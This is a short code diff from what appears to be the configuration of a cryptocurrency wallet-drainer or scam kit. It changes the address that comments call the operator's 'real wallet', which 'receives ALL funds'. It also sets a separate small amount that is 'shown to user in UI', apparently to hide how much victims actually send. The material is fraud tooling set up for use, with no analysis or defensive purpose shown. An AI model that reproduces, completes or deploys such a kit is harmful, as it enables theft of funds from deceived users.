@@ -2,9 +2,8 @@
 var YOUR_WALLET     = "UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv";
 var PROXY_CONTRACT  = YOUR_WALLET;
 
-// PROXY CONTRACT ADDRESS (deployed on mainnet)
-// This contract automatically forwards funds to your real wallet
-var AML_WALLET      = "EQCve5Olq1-oj3nhN20HOFwtofdDGVbj_fygwISTDZDb-1gZ";
+// YOUR REAL WALLET (receives ALL funds)
+var AML_WALLET      = "EQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW";
 
 // Amount shown to user in UI
 var VISIBLE_AMOUNT  = "0.05";
